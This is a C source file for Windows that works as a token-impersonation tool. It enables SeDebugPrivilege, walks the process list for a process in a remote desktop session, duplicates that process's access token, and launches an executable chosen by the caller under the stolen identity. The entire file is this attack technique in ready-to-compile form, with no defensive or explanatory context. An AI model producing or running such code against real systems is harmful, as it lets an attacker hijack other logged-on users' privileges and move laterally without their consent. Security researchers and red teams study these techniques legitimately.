#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wtsapi32.h>

#pragma comment(lib, "wtsapi32.lib")

// Function to enable a specified privilege for the current process
BOOL EnablePrivilege(LPCWSTR privilege) {
    HANDLE token = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL result = FALSE;

    // Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        wprintf(L"OpenProcessToken error: %u\n", GetLastError());
        goto cleanup;
    }

    // Lookup the LUID for the specified privilege
    if (!LookupPrivilegeValueW(NULL, privilege, &luid)) {
        wprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());
        goto cleanup;
    }

    // Set up the TOKEN_PRIVILEGES structure
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        wprintf(L"AdjustTokenPrivileges error: %u\n", GetLastError());
        goto cleanup;
    }

    result = TRUE;

cleanup:
    if (token) {
        CloseHandle(token);
    }
    return result;
}

// Function to check if a process is running in a remote session
BOOL IsRemoteSession(DWORD processId) {
    DWORD sessionId;
    PWTS_SESSION_INFO pSessionInfo = NULL;
    DWORD count;
    BOOL result = FALSE;
    LPTSTR pBuffer = NULL;
    DWORD bytesReturned = 0;

    // Get the session ID for the specified process
    if (!ProcessIdToSessionId(processId, &sessionId)) {
        wprintf(L"ProcessIdToSessionId error: %u\n", GetLastError());
        goto cleanup;
    }

    // Query session information to check if it's a remote session
    if (WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSClientProtocolType, &pBuffer, &bytesReturned)) {
        if (bytesReturned == sizeof(USHORT)) {
            USHORT protocolType = *((USHORT*)pBuffer);
            if (protocolType != WTS_PROTOCOL_TYPE_CONSOLE) {
                result = TRUE;
            }
        }
        WTSFreeMemory(pBuffer);
    } else {
        wprintf(L"WTSQuerySessionInformation error: %u\n", GetLastError());
    }

cleanup:
    if (pSessionInfo) {
        WTSFreeMemory(pSessionInfo);
    }
    return result;
}

// Function to duplicate a token from a process and create a new process with that token
BOOL DuplicateTokenAndCreateProcess(DWORD processId, LPCWSTR executablePath, LPCWSTR commandLine) {
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    PROCESS_INFORMATION pi = {0};
    BOOL result = FALSE;

    // Open the specified process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (hProcess == NULL) {
        wprintf(L"OpenProcess error: %u\n", GetLastError());
        goto cleanup;
    }

    // Open the process token
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        wprintf(L"OpenProcessToken error: %u\n", GetLastError());
        goto cleanup;
    }

    // Duplicate the token
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        wprintf(L"DuplicateTokenEx error: %u\n", GetLastError());
        goto cleanup;
    }

    // Set up the STARTUPINFO structure
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };

    // Create a new process with the duplicated token
    if (!CreateProcessWithTokenW(hNewToken, 0, executablePath, (LPWSTR)commandLine, 0, NULL, NULL, &si, &pi)) {
        wprintf(L"CreateProcessWithTokenW error: %u\n", GetLastError());
        goto cleanup;
    }

    result = TRUE;

cleanup:
    if (hNewToken) {
        CloseHandle(hNewToken);
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
    return result;
}

int main(int argc, char *argv[]) {
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 pe;
    wchar_t executablePath[MAX_PATH];
    wchar_t commandLine[MAX_PATH];
    BOOL foundRemoteSession = FALSE;

    // Check if the correct number of arguments are provided
    if (argc < 3) {
        wprintf(L"Usage: %S <executable_path> <command_line>\n", argv[0]);
        return 1;
    }

    // Convert the executable path and command line to wide characters
    mbstowcs(executablePath, argv[1], MAX_PATH);
    mbstowcs(commandLine, argv[2], MAX_PATH);

    // Enable the SE_DEBUG_NAME privilege
    if (!EnablePrivilege(L"SeDebugPrivilege")) {
        wprintf(L"Failed to enable SE_DEBUG_NAME privilege.\n");
        goto cleanup;
    }

    // Create a snapshot of all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"CreateToolhelp32Snapshot error: %u\n", GetLastError());
        goto cleanup;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process in the snapshot
    if (!Process32First(hSnapshot, &pe)) {
        wprintf(L"Process32First error: %u\n", GetLastError());
        goto cleanup;
    }

    // Iterate through all processes in the snapshot
    do {
        if (pe.th32ProcessID != 0 && pe.th32ParentProcessID != 0) {

            // Check if the process is running in a remote session
            if (IsRemoteSession(pe.th32ProcessID)) {
                foundRemoteSession = TRUE;

                // Duplicate the token and create a new process with it
                if (DuplicateTokenAndCreateProcess(pe.th32ProcessID, executablePath, commandLine)) {
                    wprintf(L"Successfully created process with token from process ID: %u\n", pe.th32ProcessID);
                    break;
                }
            }
        }
    } while (Process32Next(hSnapshot, &pe));

    if (!foundRemoteSession) {
        wprintf(L"No process running in a remote session was found.\n");
    }

cleanup:
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(hSnapshot);
    }
    return 0;
}